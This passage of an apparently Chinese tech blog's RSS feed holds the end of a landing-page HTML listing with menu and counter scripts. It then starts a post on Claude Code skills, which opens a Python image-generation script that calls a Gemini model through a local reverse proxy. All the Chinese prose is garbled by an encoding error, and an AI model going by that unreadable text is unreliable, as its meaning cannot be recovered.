&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                        &amp;lt;li&amp;gt;&amp;lt;a &lt;span class=&#34;nv&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;#&amp;#34;&lt;/span&gt;&amp;gt;Wildlife Protection&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                        &amp;lt;li&amp;gt;&amp;lt;a &lt;span class=&#34;nv&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;#&amp;#34;&lt;/span&gt;&amp;gt;Climate Education&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                        &amp;lt;li&amp;gt;&amp;lt;a &lt;span class=&#34;nv&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;#&amp;#34;&lt;/span&gt;&amp;gt;Sustainable Agriculture&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    &amp;lt;/ul&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &amp;lt;/div&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &amp;lt;div &lt;span class=&#34;nv&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;footer-column&amp;#34;&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    &amp;lt;h3&amp;gt;Contact Us&amp;lt;/h3&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    &amp;lt;p&amp;gt;Copper Creek Drive, New York&amp;lt;/p&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    &amp;lt;p&amp;gt;+1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;312&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; 171-0771&amp;lt;/p&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    &amp;lt;p&amp;gt;support@greennetwork.org&amp;lt;/p&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &amp;lt;/div&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &amp;lt;/div&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &amp;lt;div &lt;span class=&#34;nv&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;copyright&amp;#34;&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &amp;lt;p&amp;gt;&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;copy&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;2025&lt;/span&gt; Green Network. All rights reserved.&amp;lt;/p&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &amp;lt;/div&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &amp;lt;/div&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;lt;/footer&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;lt;script&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        // Mobile Menu Toggle
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        document.querySelector&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;.mobile-menu&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.addEventListener&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;click&amp;#39;&lt;/span&gt;, &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            document.querySelector&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;nav ul&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.classList.toggle&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;active&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;})&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        // Counter Animation
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; animateCounters&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            const &lt;span class=&#34;nv&#34;&gt;counters&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; document.querySelectorAll&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;.counter&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            const &lt;span class=&#34;nv&#34;&gt;speed&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; 200&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; // The lower the slower
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            counters.forEach&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;counter&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                const &lt;span class=&#34;nv&#34;&gt;target&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; +counter.getAttribute&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;data-target&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                const &lt;span class=&#34;nv&#34;&gt;count&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; +counter.innerText&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                const &lt;span class=&#34;nv&#34;&gt;inc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; target / speed&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;count &amp;lt; target&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    counter.innerText &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; Math.ceil&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;count + inc&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    setTimeout&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;animateCounters, 1&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    counter.innerText &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; target&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;o&#34;&gt;})&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        // Initialize counters when page loads
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        window.addEventListener&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;load&amp;#39;&lt;/span&gt;, animateCounters&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        // Smooth scrolling &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; navigation links
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        document.querySelectorAll&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;a[href^=&amp;#34;#&amp;#34;]&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.forEach&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;anchor&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            anchor.addEventListener&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;click&amp;#39;&lt;/span&gt;, &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;e&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                e.preventDefault&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                const &lt;span class=&#34;nv&#34;&gt;targetId&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; this.getAttribute&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;href&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;targetId&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;===&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;#&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                const &lt;span class=&#34;nv&#34;&gt;targetElement&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; document.querySelector&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;targetId&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;targetElement&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    window.scrollTo&lt;span class=&#34;o&#34;&gt;({&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                        top: targetElement.offsetTop - 80,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                        behavior: &lt;span class=&#34;s1&#34;&gt;&amp;#39;smooth&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    &lt;span class=&#34;o&#34;&gt;})&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    document.querySelector&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;nav ul&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.classList.remove&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;active&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;o&#34;&gt;})&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;})&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;lt;/script&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;/body&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;/html&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;package.json æ–‡ä»¶ï¼Œindex.js è¿è¡Œæ—¶éœ€è¦ä¾èµ–çš„å®‰è£…åŒ…æ–‡ä»¶ï¼Œå®‰è£…äº†2ä¸ªåŒ…ï¼Œaxioså’Œws&lt;/p&gt;</description>
    </item>
    <item>
      <title>Claude codeçš„skillsç¼–å†™</title>
      <link>https://rendoumi.com/posts/20251231-claude_skills/</link>
      <pubDate>Wed, 31 Dec 2025 09:40:01 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20251231-claude_skills/</guid>
      <description>&lt;p&gt;æœ€è¿‘å¤©å¤©éƒ½åœ¨å­¦ä¹ claude codeï¼ŒSkills == å·¥å…·ç®±ï¼ˆæŠ€èƒ½åº“ï¼‰&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬å¯ä»¥æŠŠskillsçœ‹æˆæ˜¯ä¸€ä¸ªä¸ªçš„å°ç¨‹åºï¼Œè¿™äº›ç¨‹åºæœ‰å…¥å£ï¼Œæœ‰å‚æ•°ï¼Œæœ‰é™åˆ¶ã€‚&lt;/p&gt;
&lt;p&gt;é‚£é€šè¿‡ä¸€ç¯‡mdæ–‡ä»¶ï¼Œæ¥å¼•å¯¼claudeæ¥æ™ºèƒ½çš„ä¼ å‚è°ƒç”¨ä½ çš„ç¨‹åºï¼Œè¿™æ ·æŠ€èƒ½ç®±å°±è¶Šæ¥è¶Šä¸°å¯Œã€‚&lt;/p&gt;
&lt;h4 id=&#34;ä¸€æˆ‘ä»¬é¦–å…ˆå‡†å¤‡è¿™ä¸ªå¯æ‰§è¡Œ-python-è„šæœ¬&#34;&gt;ä¸€ã€æˆ‘ä»¬é¦–å…ˆå‡†å¤‡è¿™ä¸ªå¯æ‰§è¡Œ python è„šæœ¬&lt;/h4&gt;
&lt;p&gt;è¿™ä¸ªæ˜¯é€šè¿‡CLIProxyAPIçš„åä»£ï¼ŒæŠŠantigravityçš„gemini3æ¨¡å‹ç»™æŠ½å‡ºæ¥ï¼Œç„¶åç”Ÿå›¾&lt;/p&gt;
&lt;p&gt;çœ‹æœ€ä¸‹é¢ï¼Œæœ‰ä¸€å †å‚æ•°&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#!/usr/bin/env python3
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;# ============================================================&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Configuration - Edit these values before use&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# é…ç½®é¡¹ - ä½¿ç”¨å‰è¯·ä¿®æ”¹ä»¥ä¸‹å€¼&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# ============================================================&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;API_BASE_URL&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;http://127.0.0.1:8317&amp;#34;&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;# API server address / API æœåŠ¡å™¨åœ°å€&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;API_KEY&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;key&amp;#34;&lt;/span&gt;                          &lt;span class=&#34;c1&#34;&gt;# Your API key / ä½ çš„ API å¯†é’¥&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;MODEL&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;gemini-3-pro-image-preview&amp;#34;&lt;/span&gt;     &lt;span class=&#34;c1&#34;&gt;# Model name / æ¨¡å‹åç§°&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# ============================================================&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;import argparse
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;import base64
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;import json
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;import os
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;import sys
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;from datetime import datetime
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;from pathlib import Path
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;from urllib import request
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;from mimetypes import guess_type
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;try:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    from google import genai
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    from google.genai import types
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;except ImportError:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;genai&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; None
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;types&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; None
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;VALID_ASPECT_RATIOS&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;1:1&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;2:3&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;3:2&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;3:4&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;4:3&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;4:5&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;5:4&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;9:16&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;16:9&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;21:9&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
